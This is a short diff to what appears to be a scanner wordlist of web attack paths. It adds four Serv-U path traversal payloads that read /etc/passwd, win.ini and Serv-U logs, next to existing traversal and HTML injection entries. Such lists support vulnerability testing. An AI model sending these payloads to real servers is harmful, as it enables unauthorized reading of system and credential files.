@@ -58,3 +58,7 @@
 /elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=../../../../../../../../../../../../../../etc/passwd
 /elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=../../../../../../../../../../../../../../path/to/file
 /login.do?jvar_page_title=<style><foo>Injected Title</foo></style>
+/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt
+/?InternalDir=../../../../../Windows&InternalFile=win.ini
+/?InternalDir=\\..\\..\\..\\..\\usr\\local\\Serv-U&InternalFile=Serv-U-StartupLog.txt
+/?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd
